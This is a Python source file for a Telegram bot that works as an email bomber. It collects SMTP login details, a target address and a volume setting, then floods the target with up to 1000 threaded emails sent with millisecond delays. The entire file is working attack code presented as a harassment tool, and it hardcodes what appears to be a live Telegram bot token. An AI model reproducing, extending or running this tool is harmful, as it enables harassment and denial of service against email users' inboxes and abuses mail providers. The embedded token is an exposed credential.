import smtplib
import threading
import telebot
import time
from email.utils import formataddr

bot = telebot.TeleBot("6138199032:AAED2by4VqEeLHWoEnoXsyWQuM7-W1YAD1M")

user_context = {}


class EmailBomber:
    def __init__(self, target, mode, amount, server, port, from_addr, from_pwd, subject, sender_name, message):
        self.target = target
        self.mode = mode
        self.amount = amount
        self.server = server
        self.port = port
        self.from_addr = from_addr
        self.from_pwd = from_pwd
        self.subject = subject
        self.sender_name = sender_name
        self.message = message

    def send_email(self, index):
        try:
            with smtplib.SMTP(self.server, self.port) as s:
                s.starttls()
                s.login(self.from_addr, self.from_pwd)

                subject = f'{self.subject} ({index + 1})'
                msg = f'''From: {formataddr((self.sender_name, self.from_addr))}\nTo: {self.target}\nSubject: {subject}\n\n{self.message}\n'''
                s.sendmail(self.from_addr, self.target, msg.encode('utf-8'))
        except smtplib.SMTPException as e:
            print(f'BOMB failed: {e}')

    def attack(self, num_threads, sleep_time, chat_id):
        try:
            print('Initializing program...')

            print('\nSetting up bomb...\n')

            threads = []

            for i in range(self.amount):
                if i % num_threads == 0 and i != 0:
                    for t in threads:
                        t.join()
                    threads.clear()

                t = threading.Thread(target=self.send_email, args=(i,))
                t.start()
                threads.append(t)
                time.sleep(sleep_time)

            for t in threads:
                t.join()

            print('\nAttack finished. DONE')
            send_bombing_complete_message(chat_id)  # Notify bombing complete
        except Exception as e:
            print(f'ERROR: {e}')
            exit(1)


@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id

    user_context[chat_id] = {}

    reply = "Welcome to Email Bomber bot!\n\nThis bot allows you to send a large number of emails to a target email address.\n\nTo start the email bombing attack, use the /bomb command."
    bot.send_message(chat_id, reply)


@bot.message_handler(commands=['bomb'])
def bomb(message):
    chat_id = message.chat.id

    if 'server' not in user_context[chat_id] or 'port' not in user_context[chat_id] \
            or 'from_addr' not in user_context[chat_id] or 'from_pwd' not in user_context[chat_id] \
            or 'subject' not in user_context[chat_id] or 'sender_name' not in user_context[chat_id] \
            or 'message' not in user_context[chat_id]:
        reply = "Please configure the email bombing settings first in the 'settings' menu."
        bot.send_message(chat_id, reply)
    else:
        reply = "Enter the target email address:"
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, set_target)


def set_target(message):
    chat_id = message.chat.id
    target = message.text

    user_context[chat_id]['target'] = target

    reply = "Enter BOMB mode:\n1: 1000\n2: 500\n3: 250"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_mode)


def set_from_pwd(message):
    chat_id = message.chat.id
    from_pwd = message.text

    user_context[chat_id]['from_pwd'] = from_pwd

    bot.send_message(chat_id, "Enter the email subject:")
    bot.register_next_step_handler(message, set_subject)


def set_subject(message):
    chat_id = message.chat.id
    subject = message.text

    user_context[chat_id]['subject'] = subject

    bot.send_message(chat_id, "Enter the sender name:")
    bot.register_next_step_handler(message, set_sender_name)


def set_sender_name(message):
    chat_id = message.chat.id
    sender_name = message.text

    user_context[chat_id]['sender_name'] = sender_name

    bot.send_message(chat_id, "Enter the message text:")
    bot.register_next_step_handler(message, set_message)


def set_mode(message):
    chat_id = message.chat.id
    mode = message.text

    if mode == '1':
        amount = 1000
        sleep_time = 0.001
    elif mode == '2':
        amount = 500
        sleep_time = 0.002
    elif mode == '3':
        amount = 250
        sleep_time = 0.004
    else:
        reply = "Invalid mode. Please try again."
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, set_mode)
        return

    user_context[chat_id]['mode'] = mode
    user_context[chat_id]['amount'] = amount
    user_context[chat_id]['sleep_time'] = sleep_time

    reply = "Enter '1' to start the bombing attack."
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, confirm_attack)


def confirm_attack(message):
    chat_id = message.chat.id
    choice = message.text

    if choice == '1':
        target = user_context[chat_id]['target']
        mode = user_context[chat_id]['mode']
        amount = user_context[chat_id]['amount']
        server = user_context[chat_id]['server']
        port = user_context[chat_id]['port']
        from_addr = user_context[chat_id]['from_addr']
        from_pwd = user_context[chat_id]['from_pwd']
        subject = user_context[chat_id]['subject']
        sender_name = user_context[chat_id]['sender_name']
        message_text = user_context[chat_id]['message']

        bomber = EmailBomber(target, mode, amount, server, port, from_addr, from_pwd, subject, sender_name, message_text)
        t = threading.Thread(target=bomber.attack, args=(1, 0, chat_id))
        t.start()

        reply = "Email bombing attack started. You will be notified when the attack is completed."
        bot.send_message(chat_id, reply)
    else:
        reply = "Invalid choice. Please try again."
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, confirm_attack)


@bot.message_handler(commands=['settings'])
def settings(message):
    chat_id = message.chat.id

    if 'server' in user_context[chat_id] and 'port' in user_context[chat_id]:
        server = user_context[chat_id]['server']
        port = user_context[chat_id]['port']
        reply = f"Email server: {server}\nSMTP port: {port}\n\nEnter '1' for SMTP setup\nEnter '2' for Edit SMTP"
    else:
        reply = "Email server and SMTP port are not configured.\n\nEnter the email server:\n1: Gmail\n2: Yahoo\n3: Outlook"

    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, handle_settings_choice)


def handle_settings_choice(message):
    chat_id = message.chat.id
    choice = message.text

    if choice == '1':
        bot.send_message(chat_id, "Enter the SMTP server:")
        bot.register_next_step_handler(message, set_smtp_server)
    elif choice == '2':
        if 'server' in user_context[chat_id] and 'port' in user_context[chat_id]:
            bot.send_message(chat_id, "Enter the new SMTP server:")
            bot.register_next_step_handler(message, set_smtp_server)
        else:
            reply = "SMTP server and port are not configured. Please configure the email bombing settings first."
            bot.send_message(chat_id, reply)
    else:
        reply = "Invalid choice. Please try again."
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, handle_settings_choice)


def set_smtp_server(message):
    chat_id = message.chat.id
    server = message.text

    user_context[chat_id]['server'] = server

    bot.send_message(chat_id, "Enter the SMTP port:")
    bot.register_next_step_handler(message, set_smtp_port)


def set_smtp_port(message):
    chat_id = message.chat.id
    port = message.text

    user_context[chat_id]['port'] = port

    bot.send_message(chat_id, "Enter your email address:")
    bot.register_next_step_handler(message, set_from_addr)


def set_from_addr(message):
    chat_id = message.chat.id
    from_addr = message.text

    user_context[chat_id]['from_addr'] = from_addr

    bot.send_message(chat_id, "Enter your email password:")
    bot.register_next_step_handler(message, set_from_pwd)




def set_message(message):
    chat_id = message.chat.id
    message_text = message.text

    user_context[chat_id]['message'] = message_text

    reply = "Email bombing settings successfully configured."
    bot.send_message(chat_id, reply)


def send_bombing_complete_message(chat_id):
    reply = "Email bombing attack completed."
    bot.send_message(chat_id, reply)


bot.polling()
